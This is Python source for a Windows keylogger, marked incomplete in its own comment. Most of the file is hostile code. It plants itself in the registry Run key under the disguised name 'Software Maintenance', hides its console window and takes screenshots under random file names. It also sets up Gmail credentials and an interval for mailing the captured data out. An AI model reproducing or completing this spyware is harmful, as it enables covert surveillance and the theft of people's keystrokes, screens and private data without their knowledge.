from ast import Add
import sys
import pythoncom , win32api
import pyWinhook as pyHook
import os,time,random,smtplib, base64, string
from winreg import *

from winregistry import *
from file1 import PASSWORD,GMAIL,SENDTO

# we got everything we need , but code is still uncomplete

print("keylogger...")

global t,start_times,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]

##########################
yourgmail = GMAIL
yourgmailpass = PASSWORD
sendto = SENDTO
interval =60

###########################

try:
    f=open("Logfile.txt",'a')
    f.close()
except:
    f=open('Logfile.txt','w')
    f.close()

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' +file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "Software Maintenance",0,REG_SZ,new_file_path)
    

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)

addStartup()

def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


print("sending data in emails...")